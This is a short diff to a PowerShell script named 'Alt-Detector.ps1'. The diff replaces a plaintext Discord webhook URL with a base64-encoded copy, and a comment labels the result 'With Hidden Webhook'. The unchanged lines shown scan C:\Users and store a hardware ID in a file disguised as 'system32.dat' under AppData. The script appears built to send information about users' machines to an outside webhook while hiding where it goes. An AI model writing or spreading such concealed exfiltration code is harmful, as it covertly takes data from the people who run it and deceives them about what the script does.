@@ -1,4 +1,8 @@
-$webhookUrl = "https://discord.com/api/webhooks/1485032402454581441/q-_dW5i362wv1YdZCLE3oHbOJJ6DeWuif6rzghbtOyfzlIVhfyprsWeGgm3aX-BmRwHb"
+# Alt-Detector.ps1 - With Hidden Webhook
+
+$webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTAzMjQwMjQ1NDU4MTQ0MS9xLS1kVzVpMzYyd3YxWWRaQ0xFM29IYk9KSjZEZVd1aWY2cnpnaGJ0T3lmemxJVmhmeXByc1dlR2dtM2FYLUJtUndIYg=="
+$webhookUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($webhookEncoded))
+
 $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
